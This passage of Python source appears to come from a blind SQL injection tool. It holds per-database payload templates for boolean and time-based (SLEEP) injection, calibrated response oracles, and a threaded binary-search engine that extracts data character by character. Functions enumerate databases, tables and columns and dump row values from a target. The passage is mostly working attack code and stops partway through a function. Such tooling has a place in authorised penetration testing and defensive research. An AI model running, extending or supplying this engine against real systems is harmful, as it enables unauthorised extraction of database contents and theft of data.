        ascii_expr=lambda expr, pos: f"ASCII(SUBSTRING(({expr}),{pos},1))",
        cast_text=_pg_like_cast,
        hex_expr=lambda expr: f"HEX(CAST(({expr}) AS VARBINARY))",
        boolean_wrapper=lambda predicate: f"1 AND (CASE WHEN ({predicate}) THEN 1 ELSE 0 END)=1--",
        time_wrapper=lambda predicate, delay: (
            f"1 AND (CASE WHEN ({predicate}) THEN SLEEP({delay:.1f}) ELSE SLEEP(0) END)--"
        ),
    ),
    "nuodb": BlindDialect(
        name="nuodb",
        length_expr=lambda expr: f"LENGTH(({expr}))",
        ascii_expr=lambda expr, pos: f"ASCII(SUBSTRING(({expr}),{pos},1))",
        cast_text=lambda expr: f"COALESCE(CAST(({expr}) AS VARCHAR), '')",
        hex_expr=lambda expr: f"HEX(CAST(({expr}) AS VARBINARY))",
        boolean_wrapper=lambda predicate: f"1 AND (CASE WHEN ({predicate}) THEN 1 ELSE 0 END)=1--",
        time_wrapper=lambda predicate, delay: (
            f"1 AND (CASE WHEN ({predicate}) THEN SLEEP({delay:.1f}) ELSE SLEEP(0) END)--"
        ),
    ),
    "singlestore": BlindDialect(
        name="singlestore",
        length_expr=lambda expr: f"LENGTH(({expr}))",
        ascii_expr=lambda expr, pos: f"ASCII(SUBSTRING(({expr}),{pos},1))",
        cast_text=_mysql_like_cast,
        hex_expr=lambda expr: f"HEX(CAST(({expr}) AS BINARY))",
        boolean_wrapper=lambda predicate: f"1 AND (CASE WHEN ({predicate}) THEN 1 ELSE 0 END)=1--",
        time_wrapper=lambda predicate, delay: f"1 AND IF(({predicate}),SLEEP({delay:.1f}),0)--",
    ),
    "oceanbase": BlindDialect(
        name="oceanbase",
        length_expr=lambda expr: f"LENGTH(({expr}))",
        ascii_expr=lambda expr, pos: f"ASCII(SUBSTRING(({expr}),{pos},1))",
        cast_text=_mysql_like_cast,
        hex_expr=lambda expr: f"HEX(CAST(({expr}) AS BINARY))",
        boolean_wrapper=lambda predicate: f"1 AND (CASE WHEN ({predicate}) THEN 1 ELSE 0 END)=1--",
        time_wrapper=lambda predicate, delay: f"1 AND IF(({predicate}),SLEEP({delay:.1f}),0)--",
    ),
    "polardb": BlindDialect(
        name="polardb",
        length_expr=lambda expr: f"LENGTH(({expr}))",
        ascii_expr=lambda expr, pos: f"ASCII(SUBSTRING(({expr}),{pos},1))",
        cast_text=_mysql_like_cast,
        hex_expr=lambda expr: f"HEX(CAST(({expr}) AS BINARY))",
        boolean_wrapper=lambda predicate: f"1 AND (CASE WHEN ({predicate}) THEN 1 ELSE 0 END)=1--",
        time_wrapper=lambda predicate, delay: f"1 AND IF(({predicate}),SLEEP({delay:.1f}),0)--",
    ),
    "tiflash": BlindDialect(
        name="tiflash",
        length_expr=lambda expr: f"LENGTH(({expr}))",
        ascii_expr=lambda expr, pos: f"ASCII(SUBSTRING(({expr}),{pos},1))",
        cast_text=_mysql_like_cast,
        hex_expr=lambda expr: f"HEX(CAST(({expr}) AS BINARY))",
        boolean_wrapper=lambda predicate: f"1 AND (CASE WHEN ({predicate}) THEN 1 ELSE 0 END)=1--",
        time_wrapper=lambda predicate, delay: f"1 AND IF(({predicate}),SLEEP({delay:.1f}),0)--",
    ),
    "yugabyte_ycql": BlindDialect(
        name="yugabyte_ycql",
        length_expr=lambda expr: f"LENGTH(({expr}))",
        ascii_expr=lambda expr, pos: f"ASCII(toString({expr}[{pos}]))",
        cast_text=lambda expr: f"toString({expr})",
        hex_expr=lambda expr: f"hex({expr})",
        boolean_wrapper=lambda predicate: f"1 AND ({predicate})",
        time_wrapper=None,
    ),
    "spanner": BlindDialect(
        name="spanner",
        length_expr=lambda expr: f"LENGTH(({expr}))",
        ascii_expr=lambda expr, pos: f"ASCII(SUBSTRING(({expr}),{pos},1))",
        cast_text=lambda expr: f"COALESCE(CAST(({expr}) AS STRING), '')",
        hex_expr=lambda expr: f"TO_HEX(CAST(({expr}) AS BYTES))",
        boolean_wrapper=lambda predicate: (
            f"1 AND (CASE WHEN ({predicate}) THEN TRUE ELSE FALSE END)=TRUE--"
        ),
        time_wrapper=None,
    ),
}


def dialect_for_dbms(dbms: str | None) -> BlindDialect | None:
    lowered = str(dbms or "").strip().lower()
    return _DIALECTS.get(lowered)


def _normalize_dbms(session: ScanSession) -> str:
    plugin = session.metadata.get("plugin")
    plugin_name = plugin.get("name") if isinstance(plugin, dict) else None
    return str(session.config.dbms or plugin_name or "").strip().lower()


def _risk_limits(session: ScanSession) -> tuple[int, int]:
    risk = max(1, int(session.config.risk or 1))
    row_cap = {1: 5, 2: 12, 3: 25}.get(risk, 25)
    char_cap = {1: 24, 2: 64, 3: 128}.get(risk, 64)
    return row_cap, char_cap


def _request_payload(session: ScanSession, payload: str) -> tuple[str, str, float]:
    prepared = _prepare_payload(session, payload)
    worker = session.clone_for_worker()
    if method_uses_body(worker.config.method):
        target, data = _apply_injection(worker, prepared)
        body, elapsed = _make_request(worker, target, data, "POST")
    else:
        target, _ = _apply_injection(worker, prepared)
        body, elapsed = _make_request(worker, target)
    return target, body, elapsed


class _BaseOracle:
    def __init__(self, session: ScanSession, dialect: BlindDialect, technique: str) -> None:
        self.session = session
        self.dialect = dialect
        self.technique = technique
        self.request_count = 0
        self.trace: list[dict[str, Any]] = []
        self.available = True

    def _record(
        self, target: str, payload: str, body: str, elapsed: float, *, decision: bool | None = None
    ) -> None:
        self.request_count += 1
        if len(self.trace) < 12:
            entry = _response_entry(target, payload, body, elapsed, limit=400)
            if decision is not None:
                entry["decision"] = decision
            self.trace.append(entry)


class BooleanSessionOracle(_BaseOracle):
    def __init__(self, session: ScanSession, dialect: BlindDialect) -> None:
        super().__init__(session, dialect, "boolean")
        self.true_body = ""
        self.false_body = ""
        self._calibrate()

    def _calibrate(self) -> None:
        true_payload = self.dialect.boolean_wrapper("1=1")
        false_payload = self.dialect.boolean_wrapper("1=0")
        target_true, body_true, elapsed_true = _request_payload(self.session, true_payload)
        target_false, body_false, elapsed_false = _request_payload(self.session, false_payload)
        self._record(target_true, true_payload, body_true, elapsed_true, decision=True)
        self._record(target_false, false_payload, body_false, elapsed_false, decision=False)
        self.true_body = body_true
        self.false_body = body_false
        self.available = bool(body_true or body_false) and (
            body_true != body_false or len(body_true) != len(body_false)
        )

    def check(self, predicate: str) -> bool:
        if not self.available:
            return False
        payload = self.dialect.boolean_wrapper(predicate)
        target, body, elapsed = _request_payload(self.session, payload)
        true_score = SequenceMatcher(None, body[:2000], self.true_body[:2000]).ratio()
        false_score = SequenceMatcher(None, body[:2000], self.false_body[:2000]).ratio()
        decision = true_score >= false_score
        self._record(target, payload, body, elapsed, decision=decision)
        return decision


class TimeSessionOracle(_BaseOracle):
    def __init__(
        self, session: ScanSession, dialect: BlindDialect, delay_seconds: float = 2.0
    ) -> None:
        super().__init__(session, dialect, "time")
        self.delay_seconds = max(1.0, float(delay_seconds))
        self.baselines: list[float] = []
        self.threshold = self.delay_seconds * 0.7
        self._calibrate()

    def _calibrate(self) -> None:
        if self.dialect.time_wrapper is None:
            self.available = False
            return
        for _ in range(3):
            target, body, elapsed = _request_payload(self.session, "1")
            self._record(target, "1", body, elapsed)
            self.baselines.append(elapsed)
        avg = mean(self.baselines) if self.baselines else 0.0
        stdev = pstdev(self.baselines) if len(self.baselines) > 1 else 0.0
        self.threshold = avg + max(0.75, self.delay_seconds * 0.55, 4 * stdev)

    def check(self, predicate: str) -> bool:
        if not self.available or self.dialect.time_wrapper is None:
            return False
        payload = self.dialect.time_wrapper(predicate, self.delay_seconds)
        target, body, elapsed = _request_payload(self.session, payload)
        decision = elapsed >= self.threshold
        if not decision:
            self.baselines.append(elapsed)
            trimmed = self.baselines[-8:]
            avg = mean(trimmed)
            stdev = pstdev(trimmed) if len(trimmed) > 1 else 0.0
            self.threshold = avg + max(0.75, self.delay_seconds * 0.55, 4 * stdev)
        self._record(target, payload, body, elapsed, decision=decision)
        return decision


class AdaptiveTimeSessionOracle(_BaseOracle):
    """Enhanced timing oracle with adaptive calibration and variance analysis."""

    def __init__(
        self, session: ScanSession, dialect: BlindDialect, delay_seconds: float = 2.0
    ) -> None:
        super().__init__(session, dialect, "time")
        self.delay_seconds = max(1.0, float(delay_seconds))
        self.baselines: list[float] = []
        self.network_variance = 0.0
        self.confidence_score = 0.0
        self.threshold = self.delay_seconds * 0.7
        self._adaptive_calibrate()

    def _adaptive_calibrate(self) -> None:
        """Multi-stage calibration with variance analysis."""
        if self.dialect.time_wrapper is None:
            self.available = False
            return

        # Stage 1: Baseline measurement (5 samples)
        stage1_times = []
        for _ in range(5):
            target, body, elapsed = _request_payload(self.session, "1")
            self._record(target, "1", body, elapsed)
            stage1_times.append(elapsed)
        self.baselines = stage1_times

        # Stage 2: Variance calculation
        avg = mean(stage1_times)
        stdev = pstdev(stage1_times) if len(stage1_times) > 1 else 0.0
        self.network_variance = stdev / avg if avg > 0 else 0.0

        # Stage 3: Dynamic threshold calculation
        # Higher variance = higher threshold to avoid false positives
        variance_multiplier = 1.0 + (self.network_variance * 2)
        base_threshold = avg + max(0.75, self.delay_seconds * 0.55)
        self.threshold = base_threshold * variance_multiplier

        # Stage 4: Confidence scoring
        # Higher variance = lower confidence
        self.confidence_score = max(0.0, 1.0 - self.network_variance)

    def check(self, predicate: str) -> bool:
        """Check with adaptive threshold adjustment."""
        if not self.available or self.dialect.time_wrapper is None:
            return False

        payload = self.dialect.time_wrapper(predicate, self.delay_seconds)
        target, body, elapsed = _request_payload(self.session, payload)

        # Adaptive threshold based on recent response patterns
        decision = elapsed >= self.threshold

        if not decision:
            # Update baseline with non-timed response
            self.baselines.append(elapsed)
            if len(self.baselines) > 10:
                self.baselines = self.baselines[-10:]

            # Recalculate variance and threshold
            avg = mean(self.baselines)
            stdev = pstdev(self.baselines) if len(self.baselines) > 1 else 0.0
            self.network_variance = stdev / avg if avg > 0 else 0.0
            variance_multiplier = 1.0 + (self.network_variance * 2)
            base_threshold = avg + max(0.75, self.delay_seconds * 0.55)
            self.threshold = base_threshold * variance_multiplier
            self.confidence_score = max(0.0, 1.0 - self.network_variance)

        self._record(target, payload, body, elapsed, decision=decision)
        return decision


class BlindInferenceEngine:
    def __init__(
        self,
        oracle: BooleanSessionOracle | TimeSessionOracle | AdaptiveTimeSessionOracle,
        dialect: BlindDialect,
        *,
        max_workers: int = 4,
        use_concurrent: bool = True,
        use_adaptive_search: bool = False,
        use_statistical_prediction: bool = True,
        use_bitwise: bool = True,
        use_batching: bool = True,
        use_progressive: bool = False,
    ) -> None:
        self.oracle = oracle
        self.dialect = dialect
        self.max_workers = max(1, int(max_workers))
        self.use_concurrent = use_concurrent
        self.use_adaptive_search = use_adaptive_search
        self.use_statistical_prediction = use_statistical_prediction
        self.use_bitwise = use_bitwise
        self.use_batching = use_batching
        self.use_progressive = use_progressive

    def infer_number(self, expression: str, *, upper_hint: int = 16, max_value: int = 4096) -> int:
        low = 0
        high = max(1, int(upper_hint))
        while high < max_value and self.oracle.check(f"({expression})>{high}"):
            low = high + 1
            high = min(max_value, high * 2)
        while low <= high:
            mid = (low + high) // 2
            if self.oracle.check(f"({expression})>{mid}"):
                low = mid + 1
            else:
                high = mid - 1
        return max(0, min(max_value, low))

    def infer_length(self, expression: str, *, max_length: int = 128) -> int:
        return self.infer_number(
            self.dialect.length_expr(expression),
            upper_hint=min(8, max_length),
            max_value=max_length,
        )

    def infer_char_code(self, expression: str, position: int, *, hi: int = 255) -> int:
        low = 0
        high = hi
        predicate_expr = self.dialect.ascii_expr(expression, position)
        while low <= high:
            mid = (low + high) // 2
            if self.oracle.check(f"({predicate_expr})>{mid}"):
                low = mid + 1
            else:
                high = mid - 1
        return max(0, min(hi, low))

    def infer_text(self, expression: str, *, max_length: int = 128, hex_mode: bool = False) -> str:
        query = expression
        decode_hex = False
        if hex_mode and self.dialect.hex_expr is not None:
            query = self.dialect.hex_expr(expression)
            max_length *= 2
            decode_hex = True
        length = self.infer_length(query, max_length=max_length)
        if length <= 0:
            return ""
        chars: dict[int, str] = {}
        with ThreadPoolExecutor(
            max_workers=min(self.max_workers, length), thread_name_prefix="stealthix-blind"
        ) as executor:
            futures = {
                executor.submit(self.infer_char_code, query, position): position
                for position in range(1, length + 1)
            }
            for future in as_completed(futures):
                position = futures[future]
                code = future.result()
                chars[position] = chr(code) if code else ""
        text = "".join(chars.get(index, "") for index in range(1, length + 1))
        if decode_hex:
            try:
                return bytes.fromhex(text).decode("utf-8", errors="replace")
            except Exception:
                return text
        return text

    def infer_number_concurrent(
        self, expression: str, *, upper_hint: int = 16, max_value: int = 4096
    ) -> int:
        """Concurrent number inference using parallel mid-point checks."""
        # Phase 1: Exponential search with parallel checks
        low = 0
        high = max(1, int(upper_hint))
        while high < max_value:
            # Check multiple mid-points in parallel
            with ThreadPoolExecutor(
                max_workers=min(self.max_workers, 4), thread_name_prefix="stealthix-blind"
            ) as executor:
                futures = {
                    executor.submit(self.oracle.check, f"({expression})>{check_point}"): check_point
                    for check_point in [high, high * 2, min(max_value, high * 4)]
                }
                results = {futures[future]: future.result() for future in as_completed(futures)}

            # Find the highest true result
            max_true = max((cp for cp, result in results.items() if result), default=high - 1)
            if max_true >= high * 4:
                low = high * 4 + 1
                high = min(max_value, high * 8)
            elif max_true >= high * 2:
                low = high * 2 + 1
                high = min(max_value, high * 4)
            elif max_true >= high:
                low = high + 1
                high = min(max_value, high * 2)
            else:
                break

        # Phase 2: Binary search with parallel mid-point checks
        while low <= high:
            mid = (low + high) // 2
            # Check mid and adjacent points in parallel
            with ThreadPoolExecutor(
                max_workers=min(self.max_workers, 3), thread_name_prefix="stealthix-blind"
            ) as executor:
                futures = {
                    executor.submit(self.oracle.check, f"({expression})>{mid}"): mid,
                    executor.submit(self.oracle.check, f"({expression})>{mid - 1}"): mid - 1,
                    executor.submit(self.oracle.check, f"({expression})>{mid + 1}"): mid + 1,
                }
                results = {futures[future]: future.result() for future in as_completed(futures)}

            if results[mid]:
                low = mid + 1
            else:
                high = mid - 1

        return max(0, min(max_value, low))

    def infer_length_concurrent(self, expression: str, *, max_length: int = 128) -> int:
        """Concurrent length inference with early termination optimization."""
        # Check multiple length points in parallel
        check_points = [1, 8, 16, 32, 64, 128]
        check_points = [cp for cp in check_points if cp <= max_length]

        with ThreadPoolExecutor(
            max_workers=min(self.max_workers, len(check_points)),
            thread_name_prefix="stealthix-blind",
        ) as executor:
            futures = {
                executor.submit(self.oracle.check, f"({expression})>={cp}"): cp
                for cp in check_points
            }
            results = {futures[future]: future.result() for future in as_completed(futures)}

        # Find the highest check point that returned true
        max_true = max((cp for cp, result in results.items() if result), default=0)

        # Binary search in the identified range
        low = max_true
        high = min(max_length, max_true * 2) if max_true > 0 else 8

        return self.infer_number(expression, upper_hint=low, max_value=high)

    def infer_char_codes_batched(
        self, expression: str, positions: list[int], *, hi: int = 255
    ) -> dict[int, int]:
        """Batched character code inference for multiple positions."""
        if not positions:
            return {}
        if self.use_batching:
            results = self.batch_char_codes_sql(expression, positions)
            if set(results) == set(positions):
                return results

        with ThreadPoolExecutor(
            max_workers=min(self.max_workers, len(positions)), thread_name_prefix="stealthix-blind"
        ) as executor:
            futures = {
                executor.submit(self.infer_char_code, expression, pos, hi=hi): pos
                for pos in positions
            }
            results = {}
            for future in as_completed(futures):
                position = futures[future]
                code = future.result()
                results[position] = code
        return results

    def batch_char_codes_sql(
        self, expression: str, positions: list[int], *, hi: int = 255
    ) -> dict[int, int]:
        """Batch multiple character code extractions using SQL UNION ALL.

        This method combines multiple ASCII() calls into a single SQL query
        using UNION ALL, then packs them into one integer that can be inferred
        through the existing blind oracle.

        Only works for databases that support UNION ALL (MySQL, PostgreSQL, MSSQL, SQLite, Oracle).
        """
        if not positions:
            return {}

        ordered = list(dict.fromkeys(int(pos) for pos in positions if int(pos) > 0))
        if not ordered:
            return {}

        base = max(2, int(hi) + 1)
        results: dict[int, int] = {}
        for start in range(0, len(ordered), _BLIND_CHAR_BATCH_SIZE):
            chunk = ordered[start : start + _BLIND_CHAR_BATCH_SIZE]
            union_parts = []
            for offset, pos in enumerate(chunk):
                ascii_expr = self.dialect.ascii_expr(expression, pos)
                weight = base**offset
                union_parts.append(
                    _select_scalar(
                        self.dialect,
                        f"{pos} AS pos",
                        f"{weight} AS weight",
                        f"{ascii_expr} AS code",
                    )
                )
            union_sql = " UNION ALL ".join(union_parts)
            packed_expr = (
                f"SELECT {_coalesce_number(self.dialect, 'SUM(code * weight)')} "
                f"FROM ({union_sql}) {_derived_alias(self.dialect, 'sx')}"
            )
            max_value = (base ** len(chunk)) - 1
            packed = self.infer_number(
                packed_expr,
                upper_hint=min(base - 1, max_value),
                max_value=max_value,
            )
            for offset, pos in enumerate(chunk):
                results[pos] = min(hi, max(0, (packed // (base**offset)) % base))
        return {pos: results.get(pos, 0) for pos in ordered}

    def batch_lengths_sql(self, expressions: list[str]) -> list[int]:
        """Batch multiple length extractions using SQL UNION ALL.

        Combines multiple LENGTH() calls into a single SQL query.
        """
        if not expressions:
            return []

        results: list[int] = []
        for start in range(0, len(expressions), _BLIND_LENGTH_BATCH_SIZE):
            chunk = expressions[start : start + _BLIND_LENGTH_BATCH_SIZE]
            union_parts = []
            for offset, expr in enumerate(chunk):
                length_expr = self.dialect.length_expr(expr)
                weight = _BLIND_LENGTH_PACK_BASE**offset
                union_parts.append(
                    _select_scalar(
                        self.dialect,
                        f"{start + offset} AS idx",
                        f"{weight} AS weight",
                        f"{length_expr} AS len",
                    )
                )
            union_sql = " UNION ALL ".join(union_parts)
            packed_expr = (
                f"SELECT {_coalesce_number(self.dialect, 'SUM(len * weight)')} "
                f"FROM ({union_sql}) {_derived_alias(self.dialect, 'sx')}"
            )
            max_value = (_BLIND_LENGTH_PACK_BASE ** len(chunk)) - 1
            packed = self.infer_number(
                packed_expr,
                upper_hint=min(_BLIND_LENGTH_PACK_BASE - 1, max_value),
                max_value=max_value,
            )
            for offset in range(len(chunk)):
                results.append(
                    (packed // (_BLIND_LENGTH_PACK_BASE**offset)) % _BLIND_LENGTH_PACK_BASE
                )
        return results

    def infer_text_batched(
        self, expression: str, *, max_length: int = 128, hex_mode: bool = False
    ) -> str:
        """Infer text using request batching where supported.

        Attempts to use SQL batching for databases that support UNION ALL,
        falling back to concurrent character extraction otherwise.
        """
        query = expression
        decode_hex = False
        if hex_mode and self.dialect.hex_expr is not None:
            query = self.dialect.hex_expr(expression)
            max_length *= 2
            decode_hex = True

        length = self.infer_length(query, max_length=max_length)
        if length <= 0:
            return ""

        codes = self.infer_char_codes_batched(query, list(range(1, length + 1)))
        text = "".join(
            chr(codes.get(position, 0)) if codes.get(position, 0) else ""
            for position in range(1, length + 1)
        )
        if decode_hex:
            try:
                return bytes.fromhex(text).decode("utf-8", errors="replace")
            except Exception:
                return text
        return text

    def summary(self) -> dict[str, Any]:
        data: dict[str, Any] = {
            "technique": self.oracle.technique,
            "requests": self.oracle.request_count,
            "trace": list(self.oracle.trace),
            "available": self.oracle.available,
        }
        if isinstance(self.oracle, TimeSessionOracle):
            data["threshold"] = self.oracle.threshold
        return data


class AdaptiveBinarySearch:
    """Adaptive binary search with dynamic search space adjustment."""

    def __init__(self, oracle: Any, initial_step: int = 16) -> None:
        """Initialize adaptive binary search.

        Args:
            oracle: Oracle for checking predicates
            initial_step: Initial step size for search
        """
        self.oracle = oracle
        self.step_size = initial_step
        self.response_history: list[tuple[str, bool]] = []
        self.monotonic_detected = False

    def search(self, expression: str, max_value: int) -> int:
        """Dynamic search space adjustment based on response patterns."""
        low = 0
        high = min(self.step_size, max_value)

        # Phase 1: Exponential search with adaptive step size
        while high < max_value:
            if not self.oracle.check(f"({expression})>{high}"):
                break
            low = high + 1
            # Adjust step size based on response patterns
            if self.monotonic_detected:
                high = min(max_value, high * 2)
            else:
                high = min(max_value, high + self.step_size)

        # Phase 2: Binary search with dynamic adjustment
        while low <= high:
            mid = (low + high) // 2
            result = self.oracle.check(f"({expression})>{mid}")
            self.response_history.append((f"({expression})>{mid}", result))

            # Detect monotonicity
            if len(self.response_history) > 3:
                recent_results = [r[1] for r in self.response_history[-4:]]
                if all(recent_results) or not any(recent_results):
                    self.monotonic_detected = True
                    # Use larger steps for monotonic regions
                    self.step_size = min(32, self.step_size * 2)

            if result:
                low = mid + 1
            else:
                high = mid - 1

        return max(0, min(max_value, low))


def infer_text_progressive(
    engine: BlindInferenceEngine, expression: str, *, max_length: int = 128, hex_mode: bool = False
) -> str:
    """Coarse-to-fine extraction strategy.

    Stage 1: Extract length (1-2 requests)
    Stage 2: Extract first 4 chars with low precision (4-8 requests)
    Stage 3: Extract full string with high precision (rest of requests)
    Early termination if string matches common pattern.
    """
    query = expression
    if hex_mode and engine.dialect.hex_expr is not None:
        query = engine.dialect.hex_expr(expression)
        max_length *= 2

    # Stage 1: Extract length
    length = engine.infer_length(query, max_length=max_length)
    if length <= 0:
        return ""

    # Stage 2: Extract first 4 characters with low precision
    if length >= 4:
        first_4 = engine.infer_char_codes_batched(query, [1, 2, 3, 4])
        prefix = "".join(chr(code) if code else "" for code in first_4.values())

        # Early termination for common patterns
        from stealthix.extraction.statistical_inference import StatisticalPredictor

        predictor = StatisticalPredictor(context=prefix)
        completions = predictor.predict_string_completion(prefix, max_length=10)
        if completions and len(completions[0]) == length:
            # Found a likely completion, verify it
            completion = completions[0]
            if len(completion) == length:
                return completion

    # Stage 3: Extract full string
    return engine.infer_text(query, max_length=max_length, hex_mode=hex_mode)


def build_blind_engine(
    session: ScanSession,
    technique: str,
    *,
    use_adaptive_timing: bool = False,
    use_concurrent: bool = True,
    use_adaptive_search: bool = False,
    use_statistical_prediction: bool = True,
    use_bitwise: bool = True,
    use_batching: bool = True,
    use_progressive: bool = False,
) -> BlindInferenceEngine | None:
    dialect = dialect_for_dbms(_normalize_dbms(session))
    if dialect is None:
        return None
    engine: BlindInferenceEngine | None = None
    if technique == "boolean":
        oracle = BooleanSessionOracle(session, dialect)
        if oracle.available:
            engine = BlindInferenceEngine(
                oracle,
                dialect,
                max_workers=session.config.worker_count(),
                use_concurrent=use_concurrent,
                use_adaptive_search=use_adaptive_search,
                use_statistical_prediction=use_statistical_prediction,
                use_bitwise=use_bitwise,
                use_batching=use_batching,
                use_progressive=use_progressive,
            )
    elif technique == "time":
        if use_adaptive_timing:
            oracle = AdaptiveTimeSessionOracle(session, dialect)
        else:
            oracle = TimeSessionOracle(session, dialect)
        if oracle.available:
            engine = BlindInferenceEngine(
                oracle,
                dialect,
                max_workers=session.config.worker_count(),
                use_concurrent=use_concurrent,
                use_adaptive_search=use_adaptive_search,
                use_statistical_prediction=use_statistical_prediction,
                use_bitwise=use_bitwise,
                use_batching=use_batching,
                use_progressive=use_progressive,
            )
    return engine


def _mysql_row(query: str, row_index: int) -> str:
    return f"SELECT value FROM ({query}) AS sx LIMIT 1 OFFSET {row_index}"


def _pg_row(query: str, row_index: int) -> str:
    return f"SELECT value FROM ({query}) AS sx LIMIT 1 OFFSET {row_index}"


def _sqlite_row(query: str, row_index: int) -> str:
    return f"SELECT value FROM ({query}) AS sx LIMIT 1 OFFSET {row_index}"


def _mssql_row(query: str, row_index: int) -> str:
    return f"SELECT value FROM (SELECT value, ROW_NUMBER() OVER (ORDER BY value) AS rn FROM ({query}) AS sx) AS ranked WHERE rn={row_index + 1}"


def _oracle_row(query: str, row_index: int) -> str:
    return f"SELECT value FROM (SELECT value, ROW_NUMBER() OVER (ORDER BY value) AS rn FROM ({query})) WHERE rn={row_index + 1}"


def _row_query(dbms: str, query: str, row_index: int) -> str:
    if dbms in {"mysql", "mariadb", "tidb"}:
        return _mysql_row(query, row_index)
    if dbms in {"postgresql", "cockroachdb", "yugabytedb"}:
        return _pg_row(query, row_index)
    if dbms == "sqlite":
        return _sqlite_row(query, row_index)
    if dbms == "mssql":
        return _mssql_row(query, row_index)
    if dbms == "oracle":
        return _oracle_row(query, row_index)
    return _pg_row(query, row_index)


def _infer_text_for_engine(
    engine: BlindInferenceEngine, expression: str, *, max_length: int = 128
) -> str:
    if engine.use_batching:
        return engine.infer_text_batched(expression, max_length=max_length)
    return engine.infer_text(expression, max_length=max_length)


def _database_source(dbms: str) -> tuple[str, str] | None:
    if dbms in {"mysql", "mariadb", "tidb"}:
        return (
            "SELECT schema_name AS value FROM information_schema.schemata",
            "SELECT COUNT(*) FROM information_schema.schemata",
        )
    if dbms in {"postgresql", "cockroachdb", "yugabytedb"}:
        return "SELECT datname AS value FROM pg_database", "SELECT COUNT(*) FROM pg_database"
    if dbms == "mssql":
        return (
            "SELECT name AS value FROM master..sysdatabases",
            "SELECT COUNT(*) FROM master..sysdatabases",
        )
    if dbms == "oracle":
        return "SELECT owner AS value FROM all_users", "SELECT COUNT(*) FROM all_users"
    if dbms == "sqlite":
        return (
            "SELECT name AS value FROM pragma_database_list",
            "SELECT COUNT(*) FROM pragma_database_list",
        )
    return None


def _table_source(dbms: str, database: str | None) -> tuple[str, str] | None:
    if dbms in {"mysql", "mariadb", "tidb"}:
        where = (
            f" WHERE table_schema={_literal(database)}"
            if database
            else " WHERE table_schema=DATABASE()"
        )
        base = f"SELECT table_name AS value FROM information_schema.tables{where}"
        return base, f"SELECT COUNT(*) FROM information_schema.tables{where}"
    if dbms in {"postgresql", "cockroachdb", "yugabytedb"}:
        where = " WHERE schemaname NOT IN ('pg_catalog','information_schema')"
        base = f"SELECT tablename AS value FROM pg_tables{where}"
        return base, f"SELECT COUNT(*) FROM pg_tables{where}"
    if dbms == "mssql":
        base = "SELECT name AS value FROM sysobjects WHERE xtype='U'"
        return base, "SELECT COUNT(*) FROM sysobjects WHERE xtype='U'"
    if dbms == "oracle":
        base = "SELECT table_name AS value FROM all_tables"
        return base, "SELECT COUNT(*) FROM all_tables"
    if dbms == "sqlite":
        base = "SELECT name AS value FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%'"
        return (
            base,
            "SELECT COUNT(*) FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%'",
        )
    return None


def _column_source(
    dbms: str, table: str | None, database: str | None = None
) -> tuple[str, str] | None:
    if not table and dbms != "sqlite":
        return None
    if dbms in {"mysql", "mariadb", "tidb"} and table:
        schema_clause = (
            f"table_schema={_literal(database)} AND "
            if database
            else "table_schema=DATABASE() AND "
        )
        base = f"SELECT column_name AS value FROM information_schema.columns WHERE {schema_clause}table_name={_literal(table)}"
        return (
            base,
            f"SELECT COUNT(*) FROM information_schema.columns WHERE {schema_clause}table_name={_literal(table)}",
        )
    if dbms in {"postgresql", "cockroachdb", "yugabytedb"} and table:
        where = f" WHERE table_name={_literal(table)} AND table_schema NOT IN ('pg_catalog','information_schema')"
        base = f"SELECT column_name AS value FROM information_schema.columns{where}"
        return base, f"SELECT COUNT(*) FROM information_schema.columns{where}"
    if dbms == "mssql" and table:
        base = f"SELECT name AS value FROM syscolumns WHERE id=OBJECT_ID({_literal(table)})"
        return base, f"SELECT COUNT(*) FROM syscolumns WHERE id=OBJECT_ID({_literal(table)})"
    if dbms == "oracle" and table:
        base = f"SELECT column_name AS value FROM all_tab_columns WHERE table_name=UPPER({_literal(table)})"
        return (
            base,
            f"SELECT COUNT(*) FROM all_tab_columns WHERE table_name=UPPER({_literal(table)})",
        )
    if dbms == "sqlite" and table:
        base = f"SELECT name AS value FROM pragma_table_info({_literal(table)})"
        return base, f"SELECT COUNT(*) FROM pragma_table_info({_literal(table)})"
    return None


def _dump_count_expr(table: str) -> str:
    return f"SELECT COUNT(*) FROM {table}"


def _dump_value_expr(dbms: str, table: str, column: str, row_index: int, order_basis: str) -> str:
    dialect = _DIALECTS[dbms]
    base = f"SELECT {dialect.cast_text(column)} AS value FROM {table} ORDER BY {order_basis}"
    return _row_query(dbms, base, row_index)


def _populate_blind_summary(result: dict[str, Any], engine: BlindInferenceEngine) -> None:
    summary = engine.summary()
    result["technique"] = summary.get("technique")
    result["responses"] = summary.get("trace", [])
    result["blind"] = summary
    result["payloads"] = [f"blind:{summary.get('technique')}"]


def enumerate_databases_blind(session: ScanSession, *, technique: str) -> dict[str, Any]:
    result = _result_base(session, "databases", [])
    result["databases"] = []
    dbms = _normalize_dbms(session)
    source = _database_source(dbms)
    engine = build_blind_engine(session, technique)
    if source is None or engine is None:
        result["warnings"].append(
            f"Blind database enumeration is unavailable for DBMS '{dbms or 'auto'}'."
        )
        return _finalize_collection_result(result, "databases")
    base_query, count_query = source
    row_cap, char_cap = _risk_limits(session)
    total = min(
        row_cap, engine.infer_number(count_query, upper_hint=min(8, row_cap), max_value=row_cap)
    )
    for row_index in range(total):
        value = _infer_text_for_engine(
            engine, _row_query(dbms, base_query, row_index), max_length=char_cap
        )
        if value:
            result["databases"].append(value)
            _record_success(result, f"blind:{technique}")
    _populate_blind_summary(result, engine)
    return _finalize_collection_result(result, "databases")


def enumerate_tables_blind(
    session: ScanSession, *, technique: str, database: str | None = None
) -> dict[str, Any]:
    result = _result_base(session, "tables", [])
    result["database"] = database
    result["tables"] = []
    dbms = _normalize_dbms(session)
    source = _table_source(dbms, database)
    engine = build_blind_engine(session, technique)
    if source is None or engine is None:
        result["warnings"].append(
            f"Blind table enumeration is unavailable for DBMS '{dbms or 'auto'}'."
        )
        return _finalize_collection_result(result, "tables")
    base_query, count_query = source
    row_cap, char_cap = _risk_limits(session)
    total = min(
        row_cap, engine.infer_number(count_query, upper_hint=min(8, row_cap), max_value=row_cap)
    )
    for row_index in range(total):
        value = _infer_text_for_engine(
            engine, _row_query(dbms, base_query, row_index), max_length=char_cap
        )
        if value:
            result["tables"].append(value)
            _record_success(result, f"blind:{technique}")
    _populate_blind_summary(result, engine)
    return _finalize_collection_result(result, "tables")


def enumerate_columns_blind(
    session: ScanSession, *, technique: str, table: str | None = None, database: str | None = None
